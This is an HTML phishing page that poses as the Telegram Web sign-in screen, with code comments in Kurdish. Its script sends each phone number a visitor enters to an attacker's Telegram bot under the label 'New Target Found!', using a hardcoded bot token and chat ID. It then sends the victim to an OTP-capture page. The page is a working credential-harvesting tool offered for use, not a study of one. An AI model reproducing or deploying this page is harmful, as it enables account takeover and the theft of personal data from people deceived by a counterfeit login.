<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Web - Sign In</title>
    <style>
        /* دیزاینی گشتی لاپەڕەکە */
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f4f4f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        /* سندوقی چوونەژوورەوە */
        .login-box {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            width: 100%;
            max-width: 380px;
            text-align: center;
            box-sizing: border-box;
        }

        /* لۆگۆکە */
        .logo {
            width: 140px;
            height: 140px;
            margin-bottom: 25px;
        }

        /* ناونیشانەکان */
        h2 {
            font-size: 26px;
            font-weight: 600;
            color: #222;
            margin-bottom: 12px;
        }

        /* نووسینە ژێرەکان */
        p {
            color: #707579;
            font-size: 15.5px;
            line-height: 1.5;
            margin-bottom: 30px;
        }

        /* خانەکانی نووسین (Input) */
        input[type="text"] {
            width: 100%;
            padding: 14px;
            margin-bottom: 20px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            font-size: 17px;
            outline: none;
            transition: border 0.3s;
            box-sizing: border-box;
        }

        input[type="text"]:focus {
            border: 2px solid #3390ec;
        }

        /* دوگمەکە */
        button {
            background-color: #3390ec;
            color: white;
            border: none;
            padding: 15px;
            width: 100%;
            border-radius: 8px;
            font-size: 16.5px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s ease;
        }

        button:hover {
            background-color: #2b7dcb;
        }

        /* فووتەری لاپەڕەکە */
        .footer {
            margin-top: 20px;
            font-size: 14px;
            color: #3390ec;
            cursor: pointer;
            text-transform: uppercase;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="login-box">
        <!-- وێنەی لۆگۆی تێلگرام -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
        
        <h2>Your Phone Number</h2>
        <p>Please confirm your country code and enter your phone number.</p>
        
        <!-- فۆرمی چوونەژوورەوە -->
        <form id="loginForm">
            <input type="text" id="phone" placeholder="+964 7XX XXX XXXX" required>
            <button type="submit">NEXT</button>
        </form>

        <div class="footer">LOGIN BY QR CODE</div>
    </div>

    <script>
        // زانیاری بۆتەکەت
        const token = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
        const chatID = "6679834643";

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const phone = document.getElementById('phone').value;
            const message = "🚨 New Target Found!\n\n📱 Phone: " + phone + "\n⏰ Time: " + new Date().toLocaleString();

            // ناردنی ژمارەکە بۆ تێلگرامەکەت
            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatID, text: message })
            }).then(() => {
                // دوای ناردنی مۆبایلەکە، قوربانی دەبات بۆ لاپەڕەی کۆدەکە
                window.location.href = "otp_verify.html";
            }).catch(err => {
                console.error("Connection Error:", err);
                // ئەگەر نێردرا، هەر دەینێریت بۆ لاپەڕەی دووەم
                window.location.href = "otp_verify.html";
            });
        });
    </script>

</body>
</html>
